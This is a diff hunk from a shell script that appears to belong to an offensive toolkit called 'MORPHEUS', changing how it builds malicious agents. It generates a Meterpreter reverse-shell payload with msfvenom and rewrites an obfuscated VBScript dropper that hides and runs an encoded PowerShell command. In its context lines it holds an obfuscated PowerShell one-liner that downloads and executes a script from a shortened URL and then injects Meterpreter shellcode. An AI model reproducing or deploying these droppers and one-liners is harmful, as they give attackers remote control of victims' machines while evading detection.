@@ -2830,12 +2830,10 @@ elif [ "$form" = "Build VBScript agent" ]; then
   sleep 2
   xterm -T "MORPHEUS - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
   disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
-  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"-wINe\"+\"NPo\"&\"WeR1\"+\"no\"+\"PS\"&\"hElL\":f0wBiQ=mId(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" 1 \"&Mid(U1kJi0,1,4)&\" \"&MiD(U1kJi0,12,1)&\" \"&mId(U1kJi0,1,1)&mID(U1kJi0,13,3)&\" \"&MiD(U1kJi0,1,1)&miD(U1kJi0,5,2)&\" \"&\"$disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ+\", 0}\"" > $IPATH/output/agent.vbs
+  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wIN\"+\"eN\"+\"PoWeR\"+\"1\"+\"noP\"+\"ShElL\"+\"noNI\":f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" \$disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/agent.vbs
 else
   echo ${BlueF}[☠]${white} Building http agent.ps1 ..${Reset};
   sleep 2
-
-# TODO: check if obfuscated agent connects back ..
 oneliner="PoWeRsHelL /W\`in 1 /n\`oP /Com\`mand \"0i=(\"{reve'+'rse_ht'+'tp}{wind'+'ows/}{met'+'erpr'+'eter/}\" -f'1','2','0');I\`EX ('({0}w-Obj\`ect {0}t.WebC\`lient).{1}Str\`ing(\"{2}bit'+'.ly/14b'+'ZZ'+'0c\")' -f'Ne','Down'+'load','htt'+'p://');In\`voke-Sh\`ell\`cod\`e –P\`ay\`loa\`d \$0i –Lh\`ost $lhost –Lp\`ort $lport –F\`or\`ce\""
 
 # default ..
